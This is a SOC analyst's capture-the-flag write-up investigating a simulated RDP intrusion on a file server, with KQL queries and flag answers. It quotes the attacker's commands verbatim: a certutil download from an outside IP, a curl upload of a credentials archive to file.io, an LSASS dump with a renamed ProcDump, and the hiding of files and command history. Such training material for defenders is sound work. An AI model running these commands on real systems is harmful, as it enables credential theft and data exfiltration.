# SOC Incident Investigation – Azuki Import/Export Compromise Part 2

<img width="600" height="800" alt="image" src="https://github.com/user-attachments/assets/03da5fec-8f9b-4395-94f7-9b2d92a777c8" />

**Analyst:** Luka Groff

**Source:** Cyber Range SOC Challenge

**System:** azuki-fileserver01

---

## Overview
After establishing initial access on November 19th, network monitoring detected the attacker returning approximately 72 hours later. Suspicious lateral movement and large data transfers were observed overnight on the file server.

---

## Key Findings

### Initial Access
- Vector: RDP (Valid Account)
- Source IP: `159.26.106.98`
- Compromised User: `kenji.sato`

### Lateral Movement
- Device / Account: `azuki-fileserver01` / `fileadmin`

### Discovery
- Share Enumeration/Remote Share Enumeration: `"net.exe" share`, `"net.exe" view \\10.1.0.188`
- Privilege Enumeration: `"whoami.exe" /all`
- Network Configuration: `"ipconfig.exe" /all`

### Defense Evasion
- Directory Hiding: `"attrib.exe" +h +s C:\Windows\Logs\CBS`
- Script Download using legitimate system utilities: `"certutil.exe"` + command

### Persistence
- Registry Modification, to run at startup: name = `FileShareSync` runs = `svchost.ps1`

### Credential Access
- Rename and execute dumping tool: `pd.exe` previously "ProcDump.exe"

### Collection & Exfiltration
- Staging Directory Path: `C:\Windows\Logs\CBS`
- Credential File Created: `IT-Admin-Passwords.csv`
- Copy of Admin share directory to a hidden windows directory: `"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`
- Compression of the entire folder for easier exfil: `"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`

### Exfiltration service: file.io

### Anti-Forensics
- Powershell history file deletion: `ConsoleHost_history.txt`

--- 

## Full Timeline

| Time (UTC) | Flag |	Stage	| Event / Artifact |
|------------|-------|-------|-----------------|
| 00:27:53 |	**Flag 1** |	Initial Access |	IP Identified → 159.26.106.98 |
| 00:38:49 |	**Flag 2** |	Lateral Movement |	Compromised Device → azuki-fileserver01 |
| 00:38:49 |	**Flag 3** |	Lateral Movement |	Compromised Account → fileadmin |
| 00:40:54 |	**Flag 4** |	Discovery |	Share Enumeration Command → "net.exe" share |
| 00:42:01 |	**Flag 5** |	Discovery |	Remote Share Enumeration Command → "net.exe" view \\10.1.0.188 |
| 00:42:24 |	**Flag 6** |	Discovery |	Privilege Enumeration Command → "whoami.exe" /all |
| 00:42:46 |	**Flag 7** |	Discovery |	Network Configuration Command → "ipconfig.exe" /all |
| 00:55:43 |	**Flag 8** |	Defence Evasion |	Directory Hiding Command → "attrib.exe" +h +s C:\Windows\Logs\CBS |
| 00:55:43 |	**Flag 9** |	Collection |	Staging Directory Path → C:\Windows\Logs\CBS |
| 00:56:47 |	**Flag 10** |	Defence Evasion |	Script Download Command → "certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1 |
| 01:07:53 |	**Flag 12** |	Collection |	Recursive Copy Command → "xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y |
| 01:07:53 |	**Flag 11** |	Collection |	Credential File Created → IT-Admin-Passwords.csv |
| 01:30:10 |	**Flag 13** |	Collection |	Compression Command → "tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin . |
| 01:59:54 |	**Flag 16** |	Exfiltration |	Exfil staged data command → "curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io |
| 01:59:54 |	**Flag 17** |	Exfiltration |	Cloud service used for exfil → file.io |
| 02:03:19 |	**Flag 14** |	Credential Access |	Renamed credential dumping tool → pd.exe |
| 02:10:50 |	**Flag 18** |	Persistence |	registry value name used to establish persistence → FileShareSync |
| 02:10:50 |	**Flag 19** |	Persistence |	persistence beacon filename → svchost.ps1 |
| 02:24:44 |	**Flag 15** |	Credential Access |	Memory Dump Command → "pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp |
| 02:26:01 |	**Flag 20** |	Anti-Forensics |	PowerShell history file was deleted → ConsoleHost_history.txt |

---

## 🚩 Flag 1: INITIAL ACCESS - Return Connection Source

Answer: 159.26.106.98

Query used: (Timestamp filtered for 22nd of November)
```
DeviceLogonEvents
| where DeviceName contains "azuki"
| where ActionType == "LogonSuccess"
| where LogonType in ("Network", "RemoteInteractive")
| project Timestamp, DeviceName, LogonType, AccountDomain, AccountName, RemoteIP
| order by Timestamp asc 
```
I found evidence that there was an RDP connection from the IP of 159.26.106.98 which corelates to the timing of the malicious activity. The RDP connection was to the same AccountName, Kenji Sato, as the initial access in Port of entry incident.

<img width="800" height="1064" alt="image" src="https://github.com/user-attachments/assets/42243de2-5cc0-4f58-a6b4-9b126fe964f3" />


---

## 🚩 Flag 2: LATERAL MOVEMENT - Compromised Device

Answer: azuki-fileserver01

The attacker, connected to the azuki-fileserver01 from the same IP he used to connect to Kenji Sato account, which can be visible from Flag 1. 

---

## 🚩 Flag 3: LATERAL MOVEMENT - Compromised Account

Answer: fileadmin

The Account name is also visible in the evidence from Flag 1.

---

## 🚩Flag 4: DISCOVERY - Share Enumeration Command

Answer: "net.exe" share

Query used:
```
DeviceProcessEvents
| where DeviceName contains "azuki-fileserver01"
| where AccountName == "fileadmin"
| where ProcessCommandLine has_any ("powershell", "cmd") or InitiatingProcessCommandLine has_any ("powershell", "cmd")
| project Timestamp, ProcessCommandLine,InitiatingProcessCommandLine, AccountName, FolderPath
```

<img width="900" height="1326" alt="image" src="https://github.com/user-attachments/assets/94532b94-8e0b-4074-9303-3a917d7884c1" />

With the command above, I could see the attacker's chain of commands, which answered most of the questions, specifically flag 4, 5, 6, 7, 8, 9, 10, 12 and 13.

- First he enumerated the network shares,
- then he enumerated remote network shares,
- identified user privileges,
- enumerated network configuration,
- created and hid the staging directory,
- downloaded a powershell script,
- staged data from a network share,
- compressed staged collection data.

These are all the actions we can see from the above evidence. The rest is covered in Flag 15.

---

## 🚩 Flag 5: DISCOVERY - Remote Share Enumeration

Answer: "net.exe" view \\10.1.0.188

---

## 🚩 Flag 6: DISCOVERY - Privilege Enumeration

Answer: "whoami.exe" /all

---

## 🚩 Flag 7: DISCOVERY - Network Configuration Command

Answer: "ipconfig.exe" /all

---

## 🚩 Flag 8: DEFENSE EVASION - Directory Hiding Command

Answer: "attrib.exe" +h +s C:\Windows\Logs\CBS

---

## 🚩 Flag 9: COLLECTION - Staging Directory Path

Answer: C:\Windows\Logs\CBS

---

## 🚩 Flag 10 DEFENSE EVASION - Script Download Command

Answer: "certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1

---

## 🚩 Flag 11: COLLECTION - Credential File Discovery

Answer: IT-Admin-Passwords.csv

Query used:
```
DeviceFileEvents
| where DeviceName contains "azuki-fileserver01"
| where FolderPath contains "C:\\Windows\\Logs\\CBS"
| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessFileName
| order by Timestamp asc 
```

<img width="800" height="152" alt="image" src="https://github.com/user-attachments/assets/dee72987-eccd-4398-966e-553b1816560a" />

I looked in the staging directory for all created files, and found the correct file, by knowing all the commands executed, which show the phrase "it-admin", as can be seen from flags 12 and 13.

---

## 🚩 Flag 12: COLLECTION - Recursive Copy Command

Answer: "xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y

---

## 🚩 Flag 13: COLLECTION - Compression Command

Answer: "tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .

---

## 🚩 Flag 14: CREDENTIAL ACCESS - Renamed Tool

Answer: pd.exe

Query used:
```
DeviceFileEvents
| where DeviceName contains "azuki-fileserver01"
| where FolderPath contains "C:\\Windows\\Logs\\CBS"
| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessFileName
| order by Timestamp asc 
```

<img width="800" height="196" alt="image" src="https://github.com/user-attachments/assets/b3499318-ccbb-4760-a730-bd9813f5d502" />

The answer can be seen from Flag15 as well. Still, there is also evidence of FileCreation and Deletion within the DeviceFileEvents of the file in question, pd.exe, which was renamed from ProcDump.exe, the Sysinternals utility.

---

## 🚩 Flag 15: CREDENTIAL ACCESS - Memory Dump Command

Answer: "pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp

Query used:
```
DeviceProcessEvents
| where DeviceName contains "azuki-fileserver01"
| where AccountName == "fileadmin"
| where ProcessCommandLine has_any ("powershell", "cmd") or InitiatingProcessCommandLine has_any ("powershell", "cmd")
| project Timestamp, ProcessCommandLine,InitiatingProcessCommandLine, AccountName, FolderPath
```
<img width="800" height="210" alt="image" src="https://github.com/user-attachments/assets/94aa33aa-a1bb-4123-b7c1-15b86a07ad4b" />

Flag 15 is also part of the commands executed by the attacker and as can be seen from the evidence provided, the attacker executed the above mentioned command to dump all memory of the PID 876 which is lsass.exe in this case and output it in the C:\Windows\Logs\CBS\ folder as lsass.dmp file.

---

## 🚩 Flag 16: EXFILTRATION - Upload Command

Answer: "curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io

Query used:
```
DeviceProcessEvents
| where DeviceName contains "azuki-fileserver01"
| where AccountName == "fileadmin"
| where ProcessCommandLine has_any ("powershell", "cmd") or InitiatingProcessCommandLine has_any ("powershell", "cmd")
| project Timestamp, ProcessCommandLine,InitiatingProcessCommandLine, AccountName, FolderPath
```
<img width="900" height="614" alt="image" src="https://github.com/user-attachments/assets/6dce7abb-de5a-4d14-8bfc-bdc99e5e0f0d" />

The evidence provided is the continuation from Flag 4, where we can see more of the attacker's commands, which answer the questions for Flags 16, 17, 18 and 19.

- The attacker uploaded zipped staged data, credentials.tar.gz, with the curl command to a file.io cloud service.
- He then set a persistence mechanism in place by adding a new registry entry in the registry path for programs that run at startup for all users. The name of that registry value is FileShareSync. At boot up, PowerShell will run the svchost.ps1 script in a hidden window.

---

## 🚩 Flag 17: EXFILTRATION - Cloud Service

Answer: file.io

---

## 🚩 Flag 18: PERSISTENCE - Registry Value Name

Answer: FileShareSync

---

## 🚩 Flag 19: PERSISTENCE - Beacon Filename

Answer: svchost.ps1

---

## 🚩 Flag 20: ANTI-FORENSICS - History File Deletion

Answer: ConsoleHost_history.txt

Query used:
```
DeviceFileEvents
| where ActionType == "FileDeleted"
| where DeviceName contains "azuki-fileserver01"
| where FileName contains "history" or FolderPath contains "PSReadLine"
| project Timestamp, ActionType, FileName, FolderPath
| order by Timestamp asc 
```

<img width="800" height="160" alt="image" src="https://github.com/user-attachments/assets/4dfde380-0fdc-4c0a-8189-8525f7f7af8e" />

This was the only file deleted in the Users/fileadmin directory. With this, the attacker wanted to hide his footprints, because the file contains the entire console/powershell history for the User folder that contains the file.
